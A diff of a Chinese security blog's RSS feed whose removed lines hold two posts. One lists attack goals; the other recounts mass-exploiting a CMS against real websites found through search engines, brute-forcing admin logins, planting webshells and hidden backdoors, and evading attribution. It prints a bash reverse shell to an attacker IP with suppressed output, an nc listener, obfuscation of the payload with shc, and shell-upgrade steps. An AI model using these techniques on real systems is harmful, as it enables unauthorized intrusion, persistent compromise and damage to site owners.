@@ -7,25 +7,6 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <lastBuildDate>Tue, 31 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://weltolk.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
-        <title>关于过去和未来</title>
-        <link>https://weltolk.github.io/p/%E5%85%B3%E4%BA%8E%E8%BF%87%E5%8E%BB%E5%92%8C%E6%9C%AA%E6%9D%A5/</link>
-        <pubDate>Tue, 31 May 2022 00:00:00 +0000</pubDate>
-        
-        <guid>https://weltolk.github.io/p/%E5%85%B3%E4%BA%8E%E8%BF%87%E5%8E%BB%E5%92%8C%E6%9C%AA%E6%9D%A5/</guid>
-        <description>&lt;img src="https://weltolk.github.io/p/%E5%85%B3%E4%BA%8E%E8%BF%87%E5%8E%BB%E5%92%8C%E6%9C%AA%E6%9D%A5/security.png" alt="Featured image of post 关于过去和未来" /&gt;&lt;h2 id=&#34;过去的时间打了很多机器以下是需要先解决然后再继续研究渗透和开发的&#34;&gt;过去的时间打了很多机器,以下是需要先解决然后再继续研究渗透和开发的:&lt;/h2&gt;
-&lt;p&gt;1.linux目标机器shell脚本反弹shell时不打印报错信息&lt;/p&gt;
-&lt;p&gt;2.linux目标机器低权限提权&lt;/p&gt;
-&lt;p&gt;3.某些linux目标机器绕disable_functions或通过其他方法执行系统命令&lt;/p&gt;
-&lt;p&gt;4.绕过某些低权限linux目标机器不允许做持久化&lt;/p&gt;
-&lt;p&gt;5.linux目标机器打内网&lt;/p&gt;
-&lt;p&gt;6.windows目标机器绕过disable_functions或通过其他方法执行系统命令&lt;/p&gt;
-&lt;p&gt;7.已经拿到windows目标机器的system权限时,做后渗透,做持久化(对windows不够了解,而且windows的后渗透比linux的后渗透难入门的多)&lt;/p&gt;
-&lt;p&gt;8.windows目标机器打内网&lt;/p&gt;
-&lt;p&gt;9.继续通过已有漏洞扫全网&lt;/p&gt;
-&lt;p&gt;10.继续研究新漏洞&lt;/p&gt;
-</description>
-        </item>
-        <item>
         <title>迅睿CMS v4.5.0到v4.5.1前台代码注入漏洞</title>
         <link>https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</link>
         <pubDate>Tue, 31 May 2022 00:00:00 +0000</pubDate>
@@ -137,240 +118,6 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;</description>
-        </item>
-        <item>
-        <title>记一次从开源cms代码审计到打通内网一个C段</title>
-        <link>https://weltolk.github.io/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E5%BC%80%E6%BA%90cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%B0%E6%89%93%E9%80%9A%E5%86%85%E7%BD%91%E4%B8%80%E4%B8%AAc%E6%AE%B5/</link>
-        <pubDate>Thu, 12 May 2022 00:00:00 +0000</pubDate>
-        
-        <guid>https://weltolk.github.io/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E5%BC%80%E6%BA%90cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%B0%E6%89%93%E9%80%9A%E5%86%85%E7%BD%91%E4%B8%80%E4%B8%AAc%E6%AE%B5/</guid>
-        <description>&lt;img src="https://weltolk.github.io/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E5%BC%80%E6%BA%90cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%B0%E6%89%93%E9%80%9A%E5%86%85%E7%BD%91%E4%B8%80%E4%B8%AAc%E6%AE%B5/security.png" alt="Featured image of post 记一次从开源cms代码审计到打通内网一个C段" /&gt;&lt;h2 id=&#34;渗透&#34;&gt;渗透&lt;/h2&gt;
-&lt;h3 id=&#34;漏洞发现&#34;&gt;漏洞发现&lt;/h3&gt;
-&lt;p&gt;第一个洞是我自己审计出来的,详情见我下面的这一篇的文章,同站的文章,报了CVD,CNNVD,CNVD,到现在一个都没消息&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.3.3%E5%88%B0v4.5.1%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8A%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;迅睿CMS v4.3.3到v4.5.1后台任意代码注入漏洞(文件写入加文件包含)&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;第二个洞是别的师傅发的,我转载到我的站上来了&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;迅睿CMS v4.5.4到v4.5.6(目前最新版)文件上传漏洞&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;第三个洞也是别的师傅发的,我转载到我的站上来了&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;迅睿CMS v4.5.0到v4.5.1前台代码注入漏洞&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;这三个洞基本覆盖了这个cms的近期版本,而且第二个洞在最新版也可以复现,所以危害还是很大的,但是前提是能进后台而且有相应的权限,第三个洞虽然是前台代码执行,但是是低版本的,所以危害也不是很大&lt;/p&gt;
-&lt;p&gt;只能说不能说是很大吧,也不能说是很小&lt;/p&gt;
-&lt;h3 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h3&gt;
-&lt;p&gt;不过既然有洞了,那么写个脚本让它自己去跑就行了,瞎猫碰上死耗子,能逮到几个站算几个&lt;/p&gt;
-&lt;p&gt;现在思路就很明确了&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;通过google语法,bing语法,fofa,zoomeye收集使用该cms的网站&lt;/li&gt;
-&lt;li&gt;找后台路径&lt;/li&gt;
-&lt;li&gt;找后台登陆密码&lt;/li&gt;
-&lt;li&gt;查看版本和权限,然后尝试利用&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h4 id=&#34;网站收集&#34;&gt;网站收集&lt;/h4&gt;
-&lt;h5 id=&#34;google语法&#34;&gt;google语法&lt;/h5&gt;
-&lt;p&gt;抓包看了一下,不是简单能搞定的,于是果断找别人的repository,在github和google找了许久,最终找到了一个能用的repository&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/howie6879/magic_google&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://github.com/howie6879/magic_google&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;通过google语法获取使用该cms的搜索结果,然后提取搜索结果里的url,记得如果有的话把gov.cn域名的url去掉&lt;/p&gt;
-&lt;h5 id=&#34;bing语法的坑&#34;&gt;bing语法的坑&lt;/h5&gt;
-&lt;p&gt;Microsoft有提供的bing搜索的api,但是要收费,加之我抓包看了一下发现爬bing比较简单,于是决定自己写&lt;/p&gt;
-&lt;p&gt;然而结果出乎我的意料,脚本发的包和在浏览器正常请求的包,在同一个设备和同一个ip下,脚本发的包竟然会被识别出来&amp;hellip;同样的搜索内容,在有多页搜索结果的情况下,脚本发的包不论请求第几页,返回的都是相同的内容&lt;/p&gt;
-&lt;p&gt;只能暂时放弃这一条路了,再研究下去不知道要研究多久,但是手动肯定更麻烦而且更慢,于是决定试一下一直听说但一直没用过的selenium&lt;/p&gt;
-&lt;p&gt;简单看了一下文档,发现挺简单的,而且用这个肯定不会被识别出来,于是愉快的爬了bing的搜索结果&lt;/p&gt;
-&lt;h5 id=&#34;fofa和zoomeye&#34;&gt;fofa和zoomeye&lt;/h5&gt;
-&lt;p&gt;这两个都有自己的搜索语法,而且比较简单,就不赘述了,注意fofa可以直接搜索web app,也可以搜索web app的指纹,两个的搜索结果是否一样要另说&lt;/p&gt;
-&lt;h5 id=&#34;收集到的url的处理&#34;&gt;收集到的url的处理&lt;/h5&gt;
-&lt;p&gt;首先把gov.cn域名的url去掉,然后再去重,最后保存起来就ok了&lt;/p&gt;
-&lt;h4 id=&#34;找后台&#34;&gt;找后台&lt;/h4&gt;
-&lt;p&gt;这个cms默认的后台是/admin.php,所以首先写个脚本试一下是不是默认的后台&lt;/p&gt;
-&lt;p&gt;不是默认的后台的站这里我用的&lt;a class=&#34;link&#34; href=&#34;https://github.com/maurosoria/dirsearch&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://github.com/maurosoria/dirsearch&lt;/a&gt;爆破&lt;/p&gt;
-&lt;p&gt;不过最近我用这个repository的导出功能时,发现这个repository导出到html格式的功能有bug,批量爆破时可能会所有结果的domain都是第一个url的,或者直接导出的html文件内容为空&lt;/p&gt;
-&lt;p&gt;最后找不到后台的站就直接放弃了&lt;/p&gt;
-&lt;h4 id=&#34;找后台密码&#34;&gt;找后台密码&lt;/h4&gt;
-&lt;p&gt;这个cms没有默认的用户名和密码,安装的时候需要手动设置用户名和密码&lt;/p&gt;
-&lt;p&gt;同时这个cms在用户名不存在时和密码错误时返回的内容不一样&lt;/p&gt;
-&lt;p&gt;所以先写个脚本批量试一下常见的用户名,注意漏洞存在的版本中,低版本的站不需要csrf,高版本的站需要csrf,csrf从后台登陆页面的html里有&lt;/p&gt;
-&lt;p&gt;因为这一步比较简单,就没用工具,自己写的,然后把不存在常见用户名的后台丢到burp suite里跑,用户名和密码的字典可以自己收集然后汇总一下,前段时间我刚自己整合了几个star比较多的repository的后台字典,以后用用看看怎么样&lt;/p&gt;
-&lt;p&gt;然后没爆破到用户名的站直接放弃,爆破到用户名的站先试一下常见的弱口令,admin,123456,用户名这样的,用脚本一会就跑完了,再把没用常见的弱口令的后台丢到burp suite爆破一遍密码,爆破的时间可以去看看前面跑出来用户名和密码的站&lt;/p&gt;
-&lt;p&gt;注意burp suite爆破的时候可以调高一下线程试试,要求并发很低的站可以放到服务器上去跑&lt;/p&gt;
-&lt;p&gt;最后没跑出来密码的站也是直接放弃就好了&lt;/p&gt;
-&lt;h4 id=&#34;利用&#34;&gt;利用&lt;/h4&gt;
-&lt;p&gt;前面提交漏洞的时候我写了个poc,稍微改一下就是exp,不过我不太喜欢用太自动化的东西,因为总有不一样的站,这次就遇到了几个不太一样的站,比如显示低版本但是实际上很多地方已经是高版本了,可能还有反过来的,所以爆破到后台密码的站我还是喜欢手动搞&lt;/p&gt;
-&lt;p&gt;具体操作还是很简单的,登陆后台,看一下版本,没权限的情况下直接放弃这个站就好了,有权限的情况下直接用前面的漏洞就拿到webshell了&lt;/p&gt;
-&lt;p&gt;此处切记要先给webshell做个备份之类的再考虑后渗透,比如在网站的关键目录里藏个免杀的马,如果不嫌麻烦的话(有风险的地方尽量少用自动化的工具)可以在服务器的每个web程序上都留个马,万一以后用到了,渗透就是越细越好,另外就是切记切记切记弹shell之后输命令的时候一定要小心,一定要小心,一定要小心,之前不小心把一个站mv到别的目录去了,而且没在别的web应用里留马,最后加急渗透旁站给他mv回去的&lt;/p&gt;
-&lt;p&gt;另外就是信息收集是最重要的,渗透测试的本质就是信息收集,如果拿到的webshell的权限很低,可以看一下子域名和端口,说不准有别的洞可以让你拿到高权限的账户&lt;/p&gt;
-&lt;h3 id=&#34;后渗透&#34;&gt;后渗透&lt;/h3&gt;
-&lt;h4 id=&#34;绕php的disable_functions&#34;&gt;绕php的disable_functions&lt;/h4&gt;
-&lt;p&gt;此处用AntSword的官方绕过插件全自动绕,而且比较安全,不会搞坏目标服务器,绕过失败的可以手动试一下,还可以看一下cms存的数据库的用户名和密码,一般都在/config/database.php里,然后看一下数据库能不能利用,比如写文件或者写日志,以及各种提权,如果绕过disable_functions失败,数据库也不能利用的可以看一下目标服务器上都有什么文件,比如其他站点或者其他可以利用的东西,如果限制了访问目录那就只能留着以后再看了&lt;/p&gt;
-&lt;h4 id=&#34;32-隐藏ip&#34;&gt;3.2 隐藏ip&lt;/h4&gt;
-&lt;p&gt;隐藏攻击ip还是很重要的,不然容易被溯源,可以上cdn或者用云函数等&lt;/p&gt;
-&lt;p&gt;但是此处也是有大坑的,能访问国外服务器的目标机器就好办了,直接上就行,但是不能访问国外服务器的目标机器,首先用Cloudflare比较卡,其次用国内的云服务商的则需要实名,而且费用也不低,所以实在没办法就别隐藏了&lt;/p&gt;
-&lt;h4 id=&#34;33-加密bash反弹shell&#34;&gt;3.3 加密bash反弹shell&lt;/h4&gt;
-&lt;p&gt;bash反弹shell:&lt;/p&gt;
-&lt;p&gt;目标机器反弹shell,不打印输出信息,防止暴露攻击机的ip等:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bash -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/攻击机的ip/攻击机接收shell的端口 0&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt; &amp;gt;/dev/null 2&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;攻击机接收反弹来的shell:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -lvvp 攻击机接收shell的端口
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//netcat版本低时l和p参数不兼容,可以nc -lvv port监听端口
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;用&lt;a class=&#34;link&#34; href=&#34;https://github.com/neurobin/shc&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://github.com/neurobin/shc&lt;/a&gt;这个repository加密一下bash脚本,加密后会生成一个c源代码文件和编译之后的二进制文件,把编译之后的二进制文件传到目标机器上执行就行了,可以弥补一下目标机器在国内时不便于隐藏攻击ip的缺陷&lt;/p&gt;
-&lt;p&gt;webshell提供的shell环境限制很多,所以最好先反弹shell,尽量不要正向连接shell,开个端口动静太大&lt;/p&gt;
-&lt;p&gt;首先是不能弹shell的情况,比如相关的bash,nc等命令都被限制了,那先尝试提权&lt;/p&gt;
-&lt;p&gt;能弹shell但是接收不到的时候,可以看一下目标是不是限制出网或者限制出站端口&lt;/p&gt;
-&lt;p&gt;如果限制出网那就先尝试提权,如果限制出站端口可以批量试一下常见的端口,在自己的vps上,通过nginx监听多个端口来快速启动多个端口,然后再在目标机器上上传个sh脚本,批量curl自己vps的指定端口,最后看一下结果就可以了,nmap &amp;mdash;top-ports 100或1000可以扫描nmap整理的100或1000个最常用的端口,可以参考一下&lt;/p&gt;
-&lt;p&gt;成功收到shell的时候,依旧是个很难用的shell,可以再升级成完全的shell再用,升级之后和真实shell一样,非常舒服&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 攻击机本地执行&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 首先检查当前终端和STTY信息&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$TERM&lt;/span&gt;      
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ stty -a 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 查看输出的rows和columns,后面配置用&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 此时攻击机已经获取到了bash&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ python -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ctrl + z //快捷键
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ stty raw -echo
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;fg&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ reset //这一步我实测有问题,输了会出问题,不输也没有影响,所以如果输了有问题可以不输
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SHELL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bash
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;TERM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;xterm-256color
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ stty rows 行数 columns 列数
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;此处的这些操作是重复性的,和具体设备无关,所以用xshell的可以写个xshell的脚本或者录制个xshell的脚本,不过我这边录制的时候生成的脚本内容总是为空,应该是个bug,也没时间研究写xshell的脚本了,所以直接用按键精灵写了个&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;SayString&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;python -c &amp;#39;import pty; pty.spawn(&amp;#34;&amp;#34;/bin/bash&amp;#34;&amp;#34;)&amp;#39;&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;WaitKey&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;WaitKey&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;WaitKey&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;WaitKey&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;SayString&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;stty raw -echo&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;WaitKey&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;WaitKey&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;SayString&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;fg&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;WaitKey&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;WaitKey&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;WaitKey&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;SayString&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;export SHELL=bash&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;WaitKey&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;WaitKey&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;SayString&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;export TERM=xterm-256color&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;WaitKey&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;WaitKey&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;SayString&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;stty rows 45 columns 184&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
